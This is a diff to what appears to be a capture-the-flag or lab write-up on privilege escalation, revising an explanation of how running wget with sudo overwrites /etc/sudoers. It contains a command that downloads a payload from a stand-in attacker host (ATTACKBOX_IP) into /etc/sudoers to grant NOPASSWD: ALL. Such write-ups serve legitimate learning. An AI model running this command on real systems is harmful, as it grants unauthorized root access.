@@ -82,7 +82,7 @@ This would write our intended permissions(root) to a file name payload and then 
 ```bash
  sudo wget ATTACKBOX_IP:8000/payload -O /etc/sudoers
 ```
- This would download our payload file over http and output it to the /etc/sudoers file. And because we're running this as root, we give ourselves the same permissions as root.
+ This would download our payload file over http and output it to the /etc/sudoers file. Because `wget` is executing with root privileges, it can overwrite `/etc/sudoers` as root. The payload changes Jessie's sudo permissions to `NOPASSWD: ALL`.
  And that was it, my permissions in the sudoers file were set in stone 😈😈
 - If we run the 
 ```bash
